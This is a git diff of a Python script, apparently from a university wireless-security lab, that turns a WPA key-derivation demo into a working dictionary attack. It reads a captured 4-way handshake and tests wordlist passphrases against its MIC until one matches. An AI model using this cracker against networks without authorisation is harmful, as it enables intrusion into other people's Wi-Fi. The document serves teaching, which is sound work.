@@ -9,12 +9,10 @@ utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
 sha-1 pour WPA2 ou MD5 pour WPA)
 """
 
-__author__      = "Abraham Rubinstein et Yann Lederrey"
-__copyright__   = "Copyright 2017, HEIG-VD"
+__author__      = "Géraud Silvestri, Alexandre Jaquier, Francis Monti"
+__copyright__   = "Copyright 2023, HEIG-VD"
 __license__ 	= "GPL"
 __version__ 	= "1.0"
-__email__ 		= "abraham.rubinstein@heig-vd.ch"
-__status__ 		= "Prototype"
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
@@ -23,6 +21,7 @@ from pbkdf2 import *
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
+from tqdm.rich import tqdm
 
 def customPRF512(key,A,B):
     """
@@ -52,7 +51,6 @@ for i, pckt in enumerate(wpa):
         break
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 ssid = association_request.info.decode("utf-8")
 APmac = a2b_hex(wpa[handshake_index].addr2.replace(":",""))
@@ -70,35 +68,28 @@ B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(A
 
 data        = wpa[handshake_index + 3].original[48:-18] + b'\0' * 16 + wpa[handshake_index + 3].original[-2:] # We retrieve the data from the payload of the 4th frame of the 4-way handshake without the MIC
 
-print ("\n\nValues used to derivate keys")
-print ("============================")
-print ("Passphrase: ",passPhrase,"\n")
-print ("SSID: ",ssid,"\n")
-print ("AP Mac: ",b2a_hex(APmac),"\n")
-print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-print ("AP Nonce: ",b2a_hex(ANonce),"\n")
-print ("Client Nonce: ",b2a_hex(SNonce),"\n")
+### Open wordlist -> for each passphrase, calculate the pmk and then the MIC using the pseudo-random function
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
+print ("Reading wordlist...")
 ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
+num_lines = sum(1 for line in open('wordlist.txt'))
 
-#expand pmk to obtain PTK
-ptk = customPRF512(pmk,str.encode(A),B)
+with open("wordlist.txt", "r") as wordlist:
+  print ("Cracking passphrase...")
+  for passPhrase in tqdm(wordlist, total=num_lines):
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    passPhrase = str.encode(passPhrase).strip()
+    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+    #expand pmk to obtain PTK
+    ptk = customPRF512(pmk,str.encode(A),B)
 
+    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:32]
 
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t\t",pmk.hex(),"\n")
-print ("PTK:\t\t",ptk.hex(),"\n")
-print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-print ("TK:\t\t",ptk[32:48].hex(),"\n")
-print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-print ("MIC:\t\t",mic.hexdigest(),"\n")
-print ("MIC to test:\t",mic_to_test,"\n")
-
+    if mic == mic_to_test:
+      print ("Passphrase found:", passPhrase.decode("utf-8"))
+      break
+  else:
+    print ("Passphrase not found in wordlist")
+  wordlist.close()
